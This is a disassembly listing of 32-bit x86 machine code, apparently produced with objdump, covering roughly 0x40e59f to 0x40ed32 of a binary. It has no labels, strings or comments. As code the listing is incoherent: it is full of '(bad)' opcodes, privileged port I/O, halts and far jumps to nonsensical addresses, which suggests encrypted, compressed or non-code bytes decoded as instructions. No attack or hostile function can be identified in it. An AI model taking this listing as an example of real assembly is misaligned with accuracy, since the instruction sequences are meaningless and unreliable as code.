  40e59f:	push   eax
  40e5a0:	les    ebp,FWORD PTR [eax-0x1a62adaf]
  40e5a6:	bound  esp,QWORD PTR [edx+ecx*1-0x5fe48844]
  40e5ad:	push   esp
  40e5ae:	(bad)  
  40e5af:	nop
  40e5b0:	dec    ecx
  40e5b1:	mov    esp,edx
  40e5b3:	cmp    eax,0x660b4c81
  40e5b8:	jp     0x40e5be
  40e5ba:	mov    eax,0x55dafaf
  40e5bf:	fld    QWORD PTR [eax+0x5381f2a8]
  40e5c5:	xlat   BYTE PTR ds:[ebx]
  40e5c6:	shl    DWORD PTR [ebx+ebp*4+0x34039e5f],0xae
  40e5ce:	mov    esi,0x10f81527
  40e5d3:	pop    es
  40e5d4:	das    
  40e5d5:	xrelease mov BYTE PTR [esp+eiz*2],bl
  40e5d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5da:	iret   
  40e5db:	inc    ebp
  40e5dc:	nop
  40e5dd:	sbb    eax,0xfad94c5c
  40e5e2:	inc    ebp
  40e5e3:	lahf   
  40e5e4:	mov    BYTE PTR [ecx-0x445b1890],bh
  40e5ea:	stos   DWORD PTR es:[edi],eax
  40e5eb:	test   DWORD PTR [ecx+0x3f],ecx
  40e5ee:	dec    ebx
  40e5ef:	xor    ebp,DWORD PTR [edi+0x55]
  40e5f2:	jb     0x40e613
  40e5f4:	cmp    ecx,DWORD PTR [ecx]
  40e5f6:	add    DWORD PTR [edi],esi
  40e5f8:	and    DWORD PTR [edi-0x2bcd50bb],ecx
  40e5fe:	mov    bl,0x86
  40e600:	fwait
  40e601:	(bad)  
  40e602:	lods   eax,DWORD PTR ds:[esi]
  40e603:	push   es
  40e604:	dec    ebp
  40e605:	jno    0x40e589
  40e607:	and    DWORD PTR [ecx-0x6f],edi
  40e60a:	adc    al,0xb4
  40e60c:	push   es
  40e60d:	test   BYTE PTR [esi+0xe5bf86d],cl
  40e613:	pop    ds
  40e614:	lahf   
  40e615:	fbstp  TBYTE PTR [ebx+ebx*4+0x1c5b45f6]
  40e61c:	loop   0x40e5c8
  40e61e:	xchg   edi,eax
  40e61f:	and    eax,0x1ac07316
  40e624:	push   eax
  40e625:	or     bh,cl
  40e627:	inc    ebp
  40e628:	ret    
  40e629:	xor    eax,0x4c45e1ae
  40e62e:	test   al,0x4b
  40e630:	xor    cl,BYTE PTR [eax+eax*1+0x7d]
  40e634:	std    
  40e635:	ja     0x40e659
  40e637:	xor    bh,BYTE PTR [ebp+0x17]
  40e63a:	popa   
  40e63b:	dec    ebp
  40e63c:	adc    edx,ebp
  40e63e:	fnstenv [ecx-0x4d55fab6]
  40e644:	mov    DWORD PTR [eax+0x4b4bf5d2],esp
  40e64a:	ficom  WORD PTR [edi]
  40e64c:	lahf   
  40e64d:	daa    
  40e64e:	sub    al,bh
  40e650:	jo     0x40e6c9
  40e652:	inc    ebx
  40e653:	int    0x8c
  40e655:	xchg   edx,eax
  40e656:	sub    eax,0x31ebf881
  40e65b:	cmp    BYTE PTR ds:[ecx-0x3d1749af],0x8
  40e663:	ror    BYTE PTR [edi-0x26a637b3],cl
  40e669:	mov    dl,0xcc
  40e66b:	fmulp  st(2),st
  40e66d:	cmp    DWORD PTR [edi+eax*1-0x46],0xa4f881b8
  40e675:	mov    ebx,DWORD PTR [edx+0x7f]
  40e678:	jge    0x40e605
  40e67a:	fisttp WORD PTR [esi+edx*2+0x18]
  40e67e:	add    esp,esi
  40e680:	cli    
  40e681:	jecxz  0x40e621
  40e683:	mov    edx,DWORD PTR [ecx+0x5d]
  40e686:	jbe    0x40e69b
  40e688:	data16 cmp BYTE PTR [esi-0x527e6a11],ch
  40e68f:	bound  edi,QWORD PTR [ebx-0x5480b517]
  40e695:	pop    ecx
  40e696:	loope  0x40e68f
  40e698:	dec    edx
  40e699:	inc    eax
  40e69a:	ins    DWORD PTR es:[edi],dx
  40e69b:	or     al,0xcf
  40e69d:	jne    0x40e6a1
  40e69f:	enter  0xeb27,0x1e
  40e6a3:	rol    ebx,1
  40e6a5:	les    eax,FWORD PTR [ecx-0x6098e050]
  40e6ab:	repnz push 0x211cf06
  40e6b1:	xor    al,0x47
  40e6b3:	xchg   esi,eax
  40e6b4:	imul   esi,esp,0x15
  40e6b7:	or     eax,0xd4235fa4
  40e6bc:	add    dh,BYTE PTR [esi]
  40e6be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6bf:	inc    edx
  40e6c0:	xor    bl,BYTE PTR [ebx]
  40e6c2:	pop    ebx
  40e6c3:	rol    dl,cl
  40e6c5:	into   
  40e6c6:	ffree  st(4)
  40e6c8:	or     al,0x66
  40e6ca:	ins    DWORD PTR es:[edi],dx
  40e6cb:	xlat   BYTE PTR ds:[ebx]
  40e6cc:	je     0x40e673
  40e6ce:	imul   ecx,DWORD PTR [eax],0x8aaedcc6
  40e6d4:	add    DWORD PTR [ecx],edx
  40e6d6:	xchg   esi,eax
  40e6d7:	int    0xc4
  40e6d9:	cwde   
  40e6da:	xchg   DWORD PTR [edi],edx
  40e6dc:	jmp    0xf06758bb
  40e6e1:	aad    0x2a
  40e6e3:	inc    ebx
  40e6e4:	jae    0x40e700
  40e6e6:	xor    BYTE PTR [ebx],dh
  40e6e8:	(bad)  
  40e6e9:	xchg   ebx,eax
  40e6ea:	dec    edx
  40e6eb:	in     al,dx
  40e6ec:	jnp    0x40e737
  40e6ee:	lea    esi,[ebx+0x164b08d8]
  40e6f4:	mov    edx,0x3b7a229
  40e6f9:	rcl    BYTE PTR [ecx+0x6974573a],cl
  40e6ff:	fisttp QWORD PTR [ebx+ebp*8+0x7600be11]
  40e706:	pop    esp
  40e707:	in     eax,0xe8
  40e709:	or     ch,dl
  40e70b:	out    0xa9,al
  40e70d:	xor    al,0x7
  40e70f:	sub    dl,bl
  40e711:	rol    DWORD PTR [eax+0x79],cl
  40e714:	cli    
  40e715:	rol    ebp,cl
  40e717:	pop    ebx
  40e718:	adc    ebp,DWORD PTR [edx+0x54dfab2c]
  40e71e:	pop    eax
  40e71f:	mov    edi,0xcd886543
  40e724:	xor    al,0xec
  40e726:	jmp    0xcacb:0xb8724e3e
  40e72d:	ss jp  0x40e77b
  40e730:	ror    DWORD PTR ss:[edi+0x72],cl
  40e734:	js     0x40e710
  40e736:	cwde   
  40e737:	or     al,0x1b
  40e739:	mov    ebx,0x7fc6686
  40e73e:	push   edi
  40e73f:	push   ebp
  40e740:	add    bh,BYTE PTR [edx]
  40e742:	jge    0x40e74c
  40e744:	inc    ecx
  40e745:	sbb    BYTE PTR [ebx+0x1e],ah
  40e748:	mov    esi,0x6802956c
  40e74d:	icebp  
  40e74e:	push   es
  40e74f:	jg     0x40e748
  40e751:	data16 jne 0x40e788
  40e754:	stos   BYTE PTR es:[edi],al
  40e755:	xor    eax,edx
  40e757:	jnp    0x40e744
  40e759:	shl    BYTE PTR [ebp+0x557ecf51],1
  40e75f:	sbb    DWORD PTR [edx],esi
  40e761:	sub    BYTE PTR [ecx+0x52b2c9b5],0xf1
  40e768:	pop    ss
  40e769:	(bad)  
  40e76a:	stos   BYTE PTR es:[edi],al
  40e76b:	jp     0x40e7d9
  40e76d:	cmp    DWORD PTR [edi+0x73],esi
  40e770:	add    ch,bl
  40e772:	aam    0x54
  40e774:	mov    bh,BYTE PTR [eax]
  40e776:	gs jp  0x40e75b
  40e779:	mov    ebp,0x75629e81
  40e77e:	in     eax,dx
  40e77f:	jecxz  0x40e70c
  40e781:	xor    DWORD PTR [ebx],ebx
  40e783:	into   
  40e784:	add    DWORD PTR [edx],0x41f55a8d
  40e78a:	sbb    ebx,DWORD PTR [ecx-0x45a00b75]
  40e790:	sub    al,BYTE PTR [esi+esi*8-0x48ff8357]
  40e797:	pop    edi
  40e798:	add    bh,BYTE PTR ds:0x70abe0f4
  40e79e:	test   BYTE PTR [eax+0x47],dh
  40e7a1:	hlt    
  40e7a2:	mov    bl,0x90
  40e7a4:	cdq    
  40e7a5:	inc    esi
  40e7a6:	jge    0x40e81a
  40e7a8:	cmp    dl,dl
  40e7aa:	iret   
  40e7ab:	push   cs
  40e7ac:	test   eax,0x564ab0fb
  40e7b1:	or     BYTE PTR ds:0xb0b8b63e,al
  40e7b7:	call   0x805be6f8
  40e7bc:	in     eax,dx
  40e7bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7be:	or     eax,0xf4afaaa
  40e7c3:	push   esi
  40e7c4:	mov    gs,WORD PTR [ebx-0x242d8b97]
  40e7ca:	nop
  40e7cb:	cmc    
  40e7cc:	pop    es
  40e7cd:	dec    esp
  40e7ce:	test   DWORD PTR [ebx],eax
  40e7d0:	push   ebx
  40e7d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7d2:	push   ds
  40e7d3:	mov    al,ds:0xda32a91
  40e7d8:	ins    DWORD PTR es:[edi],dx
  40e7d9:	or     ch,BYTE PTR [edi+0x1e]
  40e7dc:	in     al,dx
  40e7dd:	jp     0x40e80f
  40e7df:	dec    ebp
  40e7e0:	mov    dl,0x93
  40e7e2:	push   edi
  40e7e3:	xor    eax,DWORD PTR [edi+0x179438ea]
  40e7e9:	fstp   QWORD PTR [edi-0x5]
  40e7ec:	jmp    0x6f01:0x9fad9d33
  40e7f3:	mov    ds:0xd4317666,al
  40e7f8:	into   
  40e7f9:	adc    al,0xb2
  40e7fb:	inc    eax
  40e7fc:	fstp   st(2)
  40e7fe:	jp     0x40e814
  40e800:	push   cs
  40e801:	ficomp WORD PTR [ecx+edi*2+0x5b319c64]
  40e808:	lahf   
  40e809:	outs   dx,DWORD PTR ds:[esi]
  40e80a:	aam    0x70
  40e80c:	fldenv [edi-0x77fc61c9]
  40e812:	jae    0x40e86f
  40e814:	test   eax,0x896d6e8f
  40e819:	xor    bh,BYTE PTR ds:0x7222acf5
  40e81f:	xor    al,0x6a
  40e821:	int3   
  40e822:	mov    dl,0xd2
  40e824:	and    DWORD PTR [ebx],esi
  40e826:	addr16 test eax,0x85358b03
  40e82c:	xor    BYTE PTR [esi-0x597a251],0xee
  40e833:	aaa    
  40e834:	push   ebx
  40e835:	mul    BYTE PTR [ebp-0x7807bae7]
  40e83b:	mov    edx,0x7b9fc2e5
  40e840:	fst    QWORD PTR [ebx]
  40e842:	popf   
  40e843:	or     DWORD PTR [ecx-0x23fcd5b1],ebp
  40e849:	sti    
  40e84a:	rcl    BYTE PTR [esi+0x5a5da66b],0x4e
  40e851:	pop    edi
  40e852:	dec    esi
  40e853:	inc    ecx
  40e854:	(bad)  
  40e856:	push   ds
  40e857:	test   DWORD PTR [esi+0x65],edx
  40e85a:	jecxz  0x40e893
  40e85c:	add    ecx,eax
  40e85e:	(bad)  
  40e85f:	mov    al,0xbd
  40e861:	std    
  40e862:	sub    DWORD PTR [ecx],edi
  40e864:	xchg   BYTE PTR [eax-0x20],dh
  40e867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e868:	sub    BYTE PTR [edx-0x27a476f1],dh
  40e86e:	bound  ecx,QWORD PTR [ecx]
  40e870:	mov    ebx,0x598be1a9
  40e875:	cmp    cl,ch
  40e877:	inc    esi
  40e878:	(bad)  
  40e879:	out    dx,al
  40e87a:	and    esi,0xec043c91
  40e880:	lods   eax,DWORD PTR ds:[esi]
  40e881:	or     ah,BYTE PTR [edx]
  40e883:	xchg   BYTE PTR [edi-0x5b056e42],bl
  40e889:	je     0x40e8ea
  40e88b:	mov    esi,0xa3a1d486
  40e890:	and    bh,BYTE PTR ds:0xd1e80c44
  40e896:	pop    eax
  40e897:	ret    
  40e898:	lahf   
  40e899:	jmp    0x40e889
  40e89b:	daa    
  40e89c:	shl    BYTE PTR [di],1
  40e89f:	sbb    BYTE PTR [ecx-0xe80daf5],bh
  40e8a5:	pop    edi
  40e8a6:	push   esp
  40e8a7:	jmp    0x1aa16577
  40e8ac:	(bad)  
  40e8ad:	jp     0x40e91d
  40e8af:	push   ss
  40e8b0:	xor    DWORD PTR [esi],0x12ee1812
  40e8b6:	adc    al,0x94
  40e8b8:	push   ds
  40e8b9:	and    eax,0x6e966837
  40e8be:	push   es
  40e8bf:	imul   edi,DWORD PTR [eax+edx*1],0xdf6d2ecb
  40e8c6:	es jmp 0x40e88b
  40e8c9:	mul    BYTE PTR [ebx+0x4f]
  40e8cc:	jnp    0x40e8b5
  40e8ce:	add    eax,0xa11ca39
  40e8d3:	fldenv fs:[edi-0x6d]
  40e8d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8d8:	in     al,dx
  40e8d9:	ret    
  40e8da:	and    ah,BYTE PTR [ebx+0x7caee759]
  40e8e0:	fs in  al,dx
  40e8e2:	call   0x762a:0xbd4309cc
  40e8e9:	xor    ah,BYTE PTR [ebp+0x75]
  40e8ec:	outs   dx,BYTE PTR ds:[esi]
  40e8ed:	arpl   WORD PTR [esi+0x4731415e],dx
  40e8f3:	jmp    0x40e8a4
  40e8f5:	lods   eax,DWORD PTR ds:[esi]
  40e8f6:	mov    eax,ds:0xb31bd388
  40e8fb:	mov    ah,0x0
  40e8fd:	xchg   ebx,eax
  40e8fe:	and    al,0xe9
  40e900:	mov    ds:0x956123b9,al
  40e905:	in     eax,dx
  40e906:	(bad)  
  40e907:	pop    esi
  40e908:	jnp    0x40e969
  40e90a:	shl    BYTE PTR [eax+0x37ab74b6],1
  40e910:	sti    
  40e911:	sub    al,0xc9
  40e913:	fdivr  DWORD PTR [edx-0x62]
  40e916:	std    
  40e917:	cwde   
  40e918:	mov    bh,0x35
  40e91a:	mov    al,0x7c
  40e91c:	js     0x40e974
  40e91e:	int3   
  40e91f:	mov    ch,0xf4
  40e921:	mov    dl,0xb5
  40e923:	add    bl,dl
  40e925:	cmp    eax,0xf2badc07
  40e92a:	mov    eax,0x6f8da378
  40e92f:	xchg   esi,eax
  40e930:	sub    bh,BYTE PTR [edi]
  40e932:	pop    ds
  40e933:	ds mov esp,ds
  40e936:	fisttp DWORD PTR [ecx]
  40e938:	cdq    
  40e939:	mov    ebp,0xcc5fd6ca
  40e93e:	ja     0x40e909
  40e940:	in     eax,0xd1
  40e942:	push   ds
  40e943:	cmp    eax,0x61d29b99
  40e948:	xchg   dx,ax
  40e94a:	mov    eax,ds:0x182d7a1b
  40e94f:	sub    al,0xde
  40e951:	les    ecx,FWORD PTR [edx-0x7bff6146]
  40e957:	sbb    al,0xaa
  40e959:	push   edi
  40e95a:	stos   DWORD PTR es:[edi],eax
  40e95b:	mov    WORD PTR [edx],ss
  40e95d:	outs   dx,DWORD PTR ds:[esi]
  40e95e:	add    edx,DWORD PTR [ecx-0x7dc93041]
  40e964:	retf   0x7e12
  40e967:	or     al,0x5
  40e969:	dec    eax
  40e96a:	jb     0x40e9e5
  40e96c:	int    0xc6
  40e96e:	mov    edi,DWORD PTR [edi-0x1608f8f3]
  40e974:	inc    esi
  40e975:	outs   dx,DWORD PTR ds:[esi]
  40e976:	sbb    esp,DWORD PTR [ebx+0x28]
  40e979:	rol    DWORD PTR [esi-0x4b],cl
  40e97c:	pop    es
  40e97d:	jns    0x40e9bf
  40e97f:	mov    ebp,0xabdfac45
  40e984:	or     al,0x4e
  40e986:	inc    esp
  40e987:	aaa    
  40e988:	and    ebx,DWORD PTR [edx]
  40e98a:	fs enter 0x6f43,0x45
  40e98f:	dec    DWORD PTR [ebx+0x68]
  40e992:	(bad)  
  40e993:	adc    al,0x1c
  40e995:	sbb    al,BYTE PTR [edx]
  40e997:	lahf   
  40e998:	sbb    DWORD PTR [edi+eax*4+0x10d3af12],esp
  40e99f:	aam    0x44
  40e9a1:	imul   edi,DWORD PTR [eax+edx*1-0x4c0b664b],0x367b2ef6
  40e9ac:	and    esp,DWORD PTR [ecx-0x56]
  40e9af:	(bad)  
  40e9b1:	mov    al,0x7c
  40e9b3:	out    dx,eax
  40e9b4:	retf   
  40e9b5:	dec    ebx
  40e9b6:	mov    ecx,0x88ccb6e2
  40e9bb:	imul   esi,DWORD PTR [eax],0x8e6683d7
  40e9c1:	push   edi
  40e9c2:	add    dl,dh
  40e9c4:	push   0xc1247e71
  40e9c9:	jmp    0x7ea3167d
  40e9ce:	xchg   ebp,eax
  40e9cf:	sub    dl,BYTE PTR [ebp+0x7d]
  40e9d2:	les    ebx,FWORD PTR [edx+0x3a5146b5]
  40e9d8:	adc    BYTE PTR [ebp+0x4c],dl
  40e9db:	(bad)  
  40e9dc:	cli    
  40e9dd:	rcl    bh,0x56
  40e9e0:	outs   dx,BYTE PTR ds:[esi]
  40e9e1:	mov    esi,ebx
  40e9e3:	xor    eax,DWORD PTR [ebx+0x37b71658]
  40e9e9:	push   eax
  40e9ea:	mov    ds:0xd4f88776,al
  40e9ef:	hlt    
  40e9f0:	adc    BYTE PTR [esi+eiz*1],ch
  40e9f3:	push   ecx
  40e9f4:	or     al,0x42
  40e9f6:	xor    cl,BYTE PTR [edi]
  40e9f8:	dec    esp
  40e9f9:	std    
  40e9fa:	rcl    DWORD PTR [ebx+0xa831423],0xe2
  40ea01:	dec    ebx
  40ea02:	pop    ss
  40ea03:	xchg   BYTE PTR [ebp+0x79],ah
  40ea06:	cli    
  40ea07:	ds jp  0x40e991
  40ea0a:	mov    edi,0x700afbec
  40ea0f:	adc    BYTE PTR [ecx+0x36ef54d],dl
  40ea15:	xchg   edx,eax
  40ea16:	pop    edi
  40ea17:	(bad)  [edi+0x37]
  40ea1a:	mov    edx,0x9be0d8a8
  40ea1f:	loop   0x40ea23
  40ea21:	and    edi,DWORD PTR [ebx-0x16]
  40ea24:	out    0x21,al
  40ea26:	cli    
  40ea27:	lds    edx,FWORD PTR [ebx+0x72]
  40ea2a:	popa   
  40ea2b:	and    ah,ah
  40ea2d:	popf   
  40ea2e:	scas   al,BYTE PTR es:[edi]
  40ea2f:	add    dl,BYTE PTR [ecx]
  40ea31:	test   eax,0x8133ca71
  40ea36:	addr16 jo 0x40ea67
  40ea39:	add    BYTE PTR [esi+eax*1+0x5f],al
  40ea3d:	sub    DWORD PTR [esi],esp
  40ea3f:	cmp    ah,BYTE PTR [ebx]
  40ea41:	lods   eax,DWORD PTR ds:[esi]
  40ea42:	mov    BYTE PTR [eax-0x7454061a],ah
  40ea48:	mov    ds,WORD PTR [edi+0x71e062cc]
  40ea4e:	inc    ebp
  40ea4f:	(bad)  
  40ea50:	arpl   WORD PTR [edx-0x31883a88],sp
  40ea56:	sbb    BYTE PTR [edx-0x45a20647],0xba
  40ea5d:	aaa    
  40ea5e:	shr    ah,1
  40ea60:	add    bl,BYTE PTR [ebx]
  40ea62:	mov    al,0x2e
  40ea64:	lea    edi,[edx+0x5b]
  40ea67:	inc    ebp
  40ea68:	jge    0x40ea3a
  40ea6a:	loope  0x40ea8b
  40ea6c:	fsubr  QWORD PTR [ebp+esi*8-0x27]
  40ea70:	xor    al,0x8f
  40ea72:	jbe    0x40ea9e
  40ea74:	mov    ecx,0x29111e73
  40ea79:	jge    0x40ea3f
  40ea7b:	sub    dh,BYTE PTR [edx]
  40ea7d:	vpaddd ymm1,ymm4,YMMWORD PTR [edx-0x5f]
  40ea82:	xchg   ebp,eax
  40ea83:	call   0x4ba2:0x892ef863
  40ea8a:	test   DWORD PTR [edx-0x48579c25],eax
  40ea90:	mov    ebx,0xac45abf7
  40ea95:	ins    BYTE PTR es:[edi],dx
  40ea96:	push   0x2f
  40ea98:	push   0xd76b0178
  40ea9d:	lahf   
  40ea9e:	shl    DWORD PTR [ebx],cl
  40eaa0:	stos   BYTE PTR es:[edi],al
  40eaa1:	imul   BYTE PTR [ebx+esi*4]
  40eaa4:	pop    eax
  40eaa5:	ror    BYTE PTR [bx+si],1
  40eaa8:	cdq    
  40eaa9:	(bad)  
  40eaaa:	mov    WORD PTR [ecx-0x763a10ed],ss
  40eab0:	and    al,0x3a
  40eab2:	sub    dl,BYTE PTR [ecx]
  40eab4:	xor    dh,ah
  40eab6:	int    0xd9
  40eab8:	jl     0x40ea57
  40eaba:	retf   0xd2d8
  40eabd:	jmp    0x40eb10
  40eabf:	fucomp st(5)
  40eac1:	push   ecx
  40eac2:	adc    bh,BYTE PTR [eax-0x77]
  40eac5:	imul   DWORD PTR [esi+0x40]
  40eac8:	dec    ecx
  40eac9:	push   edx
  40eaca:	jge    0x40eb2f
  40eacc:	xor    eax,0x9a62dbcd
  40ead1:	(bad)  
  40ead2:	mov    ebx,0x7b295899
  40ead7:	push   ss
  40ead8:	faddp  st(1),st
  40eada:	jmp    0xc836:0xd222641f
  40eae1:	repnz sub eax,0x1f2fe4c2
  40eae7:	xchg   esp,eax
  40eae8:	jne    0x40eb40
  40eaea:	sbb    DWORD PTR [edx],ebp
  40eaec:	out    0xec,eax
  40eaee:	mov    ecx,DWORD PTR [edi]
  40eaf0:	sbb    eax,0xe0c46a2c
  40eaf5:	mov    cl,0x70
  40eaf7:	jmp    0x9869b8c6
  40eafc:	fldcw  WORD PTR [ecx-0x4e832b15]
  40eb02:	jg     0x40eb06
  40eb04:	popa   
  40eb05:	outs   dx,BYTE PTR ds:[esi]
  40eb06:	js     0x40ea8a
  40eb08:	pusha  
  40eb09:	jb     0x40eb74
  40eb0b:	xor    al,0xde
  40eb0d:	out    dx,eax
  40eb0e:	push   ebp
  40eb0f:	cdq    
  40eb10:	clc    
  40eb11:	cli    
  40eb12:	push   0xffffff93
  40eb14:	sbb    BYTE PTR [ecx+0x46a2a337],bh
  40eb1a:	(bad)  
  40eb1b:	js     0x40eb7d
  40eb1d:	mov    ebx,0x698a69ea
  40eb22:	in     al,0xb0
  40eb24:	das    
  40eb25:	inc    edx
  40eb26:	pushf  
  40eb27:	sbb    ebp,DWORD PTR [ebx-0x6c]
  40eb2a:	sub    eax,0x4a844dd2
  40eb2f:	call   0x74cf75a
  40eb34:	nop
  40eb35:	xor    eax,0x19e96c37
  40eb3a:	sbb    edx,DWORD PTR cs:[edx]
  40eb3d:	outs   dx,DWORD PTR ds:[esi]
  40eb3e:	leave  
  40eb3f:	sub    al,0x78
  40eb41:	add    eax,0x9a10fc79
  40eb46:	daa    
  40eb47:	addr16 jge 0x40eae0
  40eb4a:	add    cl,bh
  40eb4c:	sub    DWORD PTR [ebp+0x76d4beb7],edi
  40eb52:	loope  0x40eb6e
  40eb54:	nop
  40eb55:	push   es
  40eb56:	sbb    bh,bh
  40eb58:	jmp    0xf9c3:0x899baa8b
  40eb5f:	and    eax,0xa1b079fc
  40eb64:	cdq    
  40eb65:	ja     0x40eb77
  40eb67:	loopne 0x40eaf5
  40eb69:	stos   DWORD PTR es:[edi],eax
  40eb6a:	call   0x2e7a7f37
  40eb6f:	xsaves [edi]
  40eb72:	push   0xfe135e4f
  40eb77:	enter  0x3572,0xdc
  40eb7b:	cmp    al,0xff
  40eb7d:	inc    esi
  40eb7e:	push   0x3e0063bd
  40eb83:	fsubr  DWORD PTR [edi]
  40eb85:	das    
  40eb86:	jmp    0x40eb1e
  40eb88:	lods   al,BYTE PTR ds:[esi]
  40eb89:	leave  
  40eb8a:	shl    DWORD PTR [eax-0x3b363816],0xd9
  40eb91:	mov    ebp,0x26f43a4d
  40eb96:	shl    DWORD PTR [ebx-0x49bf31ca],cl
  40eb9c:	daa    
  40eb9d:	xchg   esp,eax
  40eb9e:	mov    WORD PTR [eax],?
  40eba0:	jnp    0x40eb5e
  40eba2:	std    
  40eba3:	lahf   
  40eba4:	xchg   esp,eax
  40eba5:	int3   
  40eba6:	leave  
  40eba7:	and    BYTE PTR [edx],ah
  40eba9:	mov    ch,0xf5
  40ebab:	shl    BYTE PTR [ecx],cl
  40ebad:	xor    ebp,edx
  40ebaf:	imul   ebp,DWORD PTR [ebp+0x8d85291],0x42885932
  40ebb9:	(bad)  
  40ebba:	sbb    al,0x83
  40ebbc:	loope  0x40eb59
  40ebbe:	fidiv  DWORD PTR [edx+0xf10fd08]
  40ebc4:	call   0x42b10aee
  40ebc9:	jle    0x40ec0b
  40ebcb:	or     bh,bh
  40ebcd:	mov    ch,al
  40ebcf:	std    
  40ebd0:	in     eax,dx
  40ebd1:	in     al,0xe6
  40ebd3:	push   eax
  40ebd4:	(bad)  
  40ebd5:	cmp    DWORD PTR [esi],esi
  40ebd7:	lahf   
  40ebd8:	adc    al,0x54
  40ebda:	icebp  
  40ebdb:	lods   eax,DWORD PTR ds:[esi]
  40ebdc:	jmp    0xa224:0xb32d3a7
  40ebe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebe4:	pop    ds
  40ebe5:	enter  0x29ab,0xc2
  40ebe9:	push   0xa6feea94
  40ebee:	ins    BYTE PTR es:[edi],dx
  40ebef:	ds adc dl,ah
  40ebf2:	xor    DWORD PTR [ebx+edi*4-0x56d17017],ecx
  40ebf9:	test   eax,0xb8d616f2
  40ebfe:	add    ch,BYTE PTR [edi+0x191d973e]
  40ec04:	es daa 
  40ec06:	inc    esp
  40ec07:	outs   dx,BYTE PTR ds:[esi]
  40ec08:	ja     0x40ebeb
  40ec0a:	xchg   esi,eax
  40ec0b:	stc    
  40ec0c:	(bad)  
  40ec0d:	leave  
  40ec0e:	cwde   
  40ec0f:	add    eax,DWORD PTR [edx-0x4f13e257]
  40ec15:	cmp    dh,BYTE PTR [ebx]
  40ec17:	js     0x40ec55
  40ec19:	sub    al,0x91
  40ec1b:	rcl    BYTE PTR [edx],cl
  40ec1d:	cmc    
  40ec1e:	mov    eax,gs:0xef3f18f2
  40ec24:	call   0x8213:0x43552eb9
  40ec2b:	mov    ch,0x37
  40ec2d:	dec    edi
  40ec2e:	xchg   esi,eax
  40ec2f:	clc    
  40ec30:	mov    cs,WORD PTR [edi+0x1cee0ae3]
  40ec36:	repz or al,0x47
  40ec39:	mov    ecx,0x2bc303a9
  40ec3e:	dec    edx
  40ec3f:	sbb    eax,0x4dc8eb57
  40ec44:	imul   ecx,ebx,0x15
  40ec47:	cli    
  40ec48:	mov    edi,0xfd2b7878
  40ec4d:	lea    esp,[eax+0x77]
  40ec50:	cmc    
  40ec51:	into   
  40ec52:	sub    al,0x3e
  40ec54:	outs   dx,DWORD PTR ds:[esi]
  40ec55:	ret    0x2ee3
  40ec58:	fild   QWORD PTR [ebp-0x38ad1d20]
  40ec5e:	jp     0x40ec94
  40ec60:	jns    0x40ecdc
  40ec62:	sbb    BYTE PTR [edx-0xf448ed5],0x64
  40ec69:	jne    0x40ecbf
  40ec6b:	ss dec esi
  40ec6d:	xchg   BYTE PTR [ebx+0x13559ce5],dh
  40ec73:	retf   
  40ec74:	adc    dl,bl
  40ec76:	xchg   ebp,eax
  40ec77:	jg     0x40ec9e
  40ec79:	or     DWORD PTR [edx+0x57],ebp
  40ec7c:	xor    DWORD PTR [edx],ebp
  40ec7e:	outs   dx,DWORD PTR ds:[esi]
  40ec7f:	dec    ebx
  40ec80:	test   cl,ch
  40ec82:	dec    ebp
  40ec83:	push   esp
  40ec84:	push   ebx
  40ec85:	leave  
  40ec86:	cmp    ah,BYTE PTR [ebx]
  40ec88:	sar    BYTE PTR [edi],cl
  40ec8a:	popa   
  40ec8b:	jecxz  0x40ec92
  40ec8d:	icebp  
  40ec8e:	mov    ecx,0xec861e4d
  40ec93:	ins    DWORD PTR es:[edi],dx
  40ec94:	inc    edi
  40ec95:	aad    0xb3
  40ec97:	jb     0x40ec64
  40ec99:	(bad)  
  40ec9a:	popa   
  40ec9b:	mov    eax,ds:0x91f5047c
  40eca0:	pop    ebp
  40eca1:	(bad)  
  40eca4:	test   BYTE PTR [ecx+edi*8+0xe],al
  40eca8:	enter  0x6829,0x47
  40ecac:	enter  0x46ce,0xba
  40ecb0:	xor    BYTE PTR [eax+0x57],dh
  40ecb3:	out    0x82,eax
  40ecb5:	mov    edi,0x179e8d40
  40ecba:	inc    esi
  40ecbb:	das    
  40ecbc:	sar    DWORD PTR [ebp+0x5f],0xf6
  40ecc0:	xor    dh,BYTE PTR [eax]
  40ecc2:	push   esp
  40ecc3:	aad    0x4e
  40ecc5:	cdq    
  40ecc6:	dec    esp
  40ecc7:	and    DWORD PTR [ebx-0x4e],ebp
  40ecca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eccb:	repnz mov esi,0x7cd8df2
  40ecd1:	es push esp
  40ecd3:	cmp    BYTE PTR ds:0x9831961f,cl
  40ecd9:	add    ah,dh
  40ecdb:	sub    BYTE PTR [edi+0x1c],ah
  40ecde:	and    ah,BYTE PTR [edi-0x3aa825e4]
  40ece4:	jp     0x40ecb6
  40ece6:	dec    edi
  40ece7:	sbb    al,BYTE PTR [ebp+0x19aea5a5]
  40eced:	enter  0x8c65,0xa8
  40ecf1:	inc    ecx
  40ecf2:	sub    BYTE PTR [edx],ch
  40ecf4:	fs or  eax,esp
  40ecf7:	out    dx,al
  40ecf8:	inc    esp
  40ecf9:	fidivr WORD PTR [edi]
  40ecfb:	aam    0xf4
  40ecfd:	push   ebx
  40ecfe:	jno    0x40ecd9
  40ed00:	sub    BYTE PTR [ecx],0x27
  40ed03:	mov    ?,WORD PTR [edx]
  40ed05:	pop    ebx
  40ed06:	mov    BYTE PTR [esi-0x41],cl
  40ed09:	push   ebx
  40ed0a:	cld    
  40ed0b:	jbe    0x40ed67
  40ed0d:	mov    eax,ds:0xdd947255
  40ed12:	ins    BYTE PTR es:[edi],dx
  40ed13:	aaa    
  40ed14:	js     0x40ec9b
  40ed16:	sahf   
  40ed17:	cmp    cl,BYTE PTR [edx+eiz*4+0x71]
  40ed1b:	xchg   edi,eax
  40ed1c:	adc    dh,BYTE PTR [esp+ecx*8+0x733c570d]
  40ed23:	mov    dh,BYTE PTR [eax-0x23aab40e]
  40ed29:	dec    ecx
  40ed2a:	xor    dh,BYTE PTR [ebx+0x696fa6fe]
  40ed30:	push   0xfffffff5
  40ed32:	mov    esp,0xe67a4a2a
